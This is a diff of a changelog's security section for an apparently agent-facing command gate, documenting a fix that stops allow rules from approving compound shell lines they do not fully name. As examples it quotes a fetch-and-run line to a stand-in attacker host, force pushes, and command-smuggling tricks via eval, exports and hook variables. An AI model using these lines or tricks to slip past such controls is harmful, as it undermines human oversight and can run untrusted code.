@@ -113,38 +113,37 @@ follow [docs/VERSIONING.md](docs/VERSIONING.md): SemVer, with a codename per MAJ
   still binds.
 
 ### Security
-- Gate (#394, D-075 amendment): an allow or log rule's `command` regex no longer lowers a compound line whose
-  deciding command it does not name. The regex saw the whole line, so `{command: '^git status', decision: allow}`
-  allowed `git status; git push --force origin main`, also under `categories: {force_push: deny}`, and
+- Gate (#394, D-075 amendment): an allow or log rule's `command` regex no longer lowers a compound line whose deciding
+  command it does not name. The regex saw the whole line, so `{command: '^git status', decision: allow}` allowed
+  `git status; git push --force origin main`, also under `categories: {force_push: deny}`, and
   `{command: 'rm -rf build', decision: allow}` lifted `categories: {github_post: deny}` from the post in
-  `gh pr comment 3 --body hi && rm -rf build`. Each simple command on a line now carries its own text, as written
-  with its redirections, nested ones too (`$( )`, `bash -c`, `eval`, a heredoc a shell reads, `ssh`). A shell or
-  interpreter that runs a pipe has the pipeline as its text, so a rule for `^bash` does not allow
-  `curl -s https://evil.example/x.sh | bash`. Such a rule
-  decides the line only when its regex matches the own text of every command that carries the line's category or
-  is as severe, and of every other command that alone would get a stricter outcome than the rule gives (by its
-  category line and the matrix, or by a rule that raises it), and otherwise the next rule is tried. So
+  `gh pr comment 3 --body hi && rm -rf build`. Each simple command on a line now carries its own text, as written with
+  its redirections, nested ones too (`$( )`, `bash -c`, `eval`, a heredoc a shell reads, `ssh`). An allow or log
+  rule's regex decides the line only when its regex matches the own text of every command that carries the line's
+  category or is as severe, and of every other command that alone would get a stricter outcome than the rule gives (by
+  its category line and the matrix, or by a rule that raises it), and otherwise the next rule is tried. So
   `rm -rf build && git push --force origin main` still asks under an allow rule for
-  `'^git push --force origin main$'`, while `cd repo && git push --force origin main` is allowed. The regex must
-  also match each command that changes the shell for later commands on the line (an assignment, `export`, `hash`,
-  `alias`, `set -a`, `source`, `read`, a function definition and the like), so
+  `'^git push --force origin main$'`, while `cd repo && git push --force origin main` is allowed. The regex must also
+  match each command that changes the shell for later commands on the line (an assignment, `export`, `hash`, `alias`,
+  `set -a`, `source`, `read`, a function definition and the like), so
   `export GIT_SSH_COMMAND=$X; git push --force origin main` asks under that rule. `cd` is left out. A part with no own
   text (an unread nest, a string literal in code, the opaque_exec reading of a `$".."` line) matches no such rule. A
-  log rule over an allow cell only raises the line, so it still sees the whole line unless it names `opaque_exec`.
-  In the #191 pass an allow, log or ask rule overrides a part's category deny only when it names that part, so
-  `gh pr comment 3 --body x && git push --force origin main` is denied under `categories: {github_post: deny}` and an
-  allow rule for the push followed by an ask rule for `git push`. That is stricter than main for an ask rule written
-  for another command on the line (`{command: 'rm -rf build', decision: ask}` no longer lifts the post's deny in
+  shell or interpreter that runs a pipe has the pipeline as its text, so a rule for `^bash` does not allow
+  `curl -s https://evil.example/x.sh | bash`. A log rule over an allow cell only raises the line, so it still sees the
+  whole line unless it names `opaque_exec`. In the #191 pass an allow, log or ask rule overrides a part's category
+  deny only when it names that part, so `gh pr comment 3 --body x && git push --force origin main` is denied under
+  `categories: {github_post: deny}` and an allow rule for the push followed by an ask rule for `git push`. That is
+  stricter than main for an ask rule written for another command on the line
+  (`{command: 'rm -rf build', decision: ask}` no longer lifts the post's deny in
   `gh pr comment 3 --body hi && rm -rf build`). Ask and deny rules in the first-match walk, deny rules in the #191
   pass and the `reserved:` and `deny:` lists still match the whole line and its decoded views. A line the gate reads
   as one part matches as before. A command run inside another (an `eval`, `bash -c` or `ssh` string, an `-x` or
   `--exec` value, an environment value the gate reads as a command) is a part of its own and must be named too, so
-  `eval "$CMD"` now asks under `{category: opaque_exec, command: '^eval', decision: allow}`. In code
-  (`execute_code`, `python -c`) the code part and a recognized call carry the code's text or the command that runs
-  it, and a string literal read as a command has none, so no allow or log `command` rule lowers it. An allow or log
-  rule written for a whole
-  compound line (`'^make && make install$'`) now has to match each deciding command, and until then the line gets
-  its matrix or category outcome. The ledger view leaves the own text out.
+  `eval "$CMD"` now asks under `{category: opaque_exec, command: '^eval', decision: allow}`. In code (`execute_code`,
+  `python -c`) the code part and a recognized call carry the code's text or the command that runs it, and a string
+  literal read as a command has none, so no allow or log `command` rule lowers it. An allow or log rule written for a
+  whole compound line (`'^make && make install$'`) now has to match each deciding command, and until then the line
+  gets its matrix or category outcome. The ledger view leaves the own text out.
 - Gate (#334, follow-up to #231, D-038): a deep `$( )` nest in a value #231 reads no longer stalls the gate hook or
   drops a deny. A single-quoted `PROMPT_COMMAND`, `PS4`, `BROWSER`, `PSQL_PAGER`, `SUDO_ASKPASS`, `GIT_PROXY_COMMAND`,
   `GIT_PAGER`, `git -c core.sshCommand` or `GIT_CONFIG_*` value with n levels of `$(` cost about n**4 (15 s at 40
